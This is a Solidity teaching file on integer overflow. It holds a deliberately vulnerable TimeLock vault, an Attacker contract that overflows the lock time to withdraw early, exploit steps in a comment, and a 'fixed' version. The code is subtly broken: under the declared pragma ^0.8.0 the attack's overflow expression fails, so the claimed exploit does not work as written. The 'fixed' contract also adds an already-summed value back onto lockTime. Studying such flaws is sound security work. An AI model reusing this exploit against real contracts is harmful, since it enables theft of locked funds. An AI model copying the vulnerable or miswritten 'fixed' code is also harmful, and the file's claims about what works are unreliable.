//SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Address} from "@openzeppelin/contracts/utils/Address.sol";
import {Math} from "@openzeppelin/contracts/utils/math/Math.sol";

// Vulnerability
// Solidity < 0.8
// Integers in Solidity overflow / underflow without any errors

// Solidity >= 0.8
// Default behaviour of Solidity 0.8 for overflow / underflow is to throw an error.

// This contract is designed to act as a time vault.
// User can deposit into this contract but cannot withdraw for atleast a week.
// User can also extend the wait time beyond the 1 week waiting period.

/*
1. Deploy TimeLock
2. Deploy Attack with address of TimeLock
3. Call Attack.attack sending 1 ether. You will immediately be able to
   withdraw your ether.

What happened?
Attack caused the TimeLock.lockTime to overflow and was able to withdraw
before the 1 week waiting period.
*/

contract TimeLock {
    mapping(address => uint256) public balances;
    mapping(address => uint256) public lockTime;

    function deposit() external payable {
        address user = msg.sender;
        balances[user] += msg.value;
        lockTime[user] += block.timestamp + 1 weeks;
    }

    function withdraw() external {
        address user = msg.sender;
        uint256 amount = balances[user];
        require(block.timestamp > lockTime[user]);
        require(amount > 0);

        balances[user] = 0;
        Address.sendValue(payable(user), amount);
    }

    function increaseLockTime(uint256 secondToIncrease) external {
        lockTime[msg.sender] += secondToIncrease;
    }
}

contract Attacker {
    TimeLock private s_timeLock;

    constructor(address timeLock_) {
        s_timeLock = TimeLock(timeLock_);
    }

    fallback() external payable {}

    function attack() external payable {
        s_timeLock.deposit{value: 1 ether}();
        /*
        if t = current lock time then we need to find x such that
        x + t = 2**256 = 0
        so x = 2**256 -t
        2**256 = type(uint).max + 1
        so x = type(uint).max + 1 - t
        */
        s_timeLock.increaseLockTime(type(uint256).max + 1 - s_timeLock.lockTime(address(this)));
        s_timeLock.deposit();
    }
}

//-------------------------------Good example-------------------------------------------------------------
// Preventative Techniques
// Use SafeMath to will prevent arithmetic overflow and underflow

// Solidity 0.8 defaults to throwing an error for overflow / underflow
contract TimeLockGood {
    mapping(address => uint256) public balances;
    mapping(address => uint256) public lockTime;

    function deposit() external payable {
        address user = msg.sender;
        balances[user] += msg.value;
        lockTime[user] += block.timestamp + 1 weeks;
    }

    function withdraw() external {
        address user = msg.sender;
        uint256 amount = balances[user];
        require(block.timestamp > lockTime[user]);
        require(amount > 0);

        balances[user] = 0;
        Address.sendValue(payable(user), amount);
    }

    function increaseLockTime(uint256 secondToIncrease) external {
        (bool success, uint256 result) = Math.tryAdd(lockTime[msg.sender], secondToIncrease);
        require(success);
        lockTime[msg.sender] += result;
    }
}
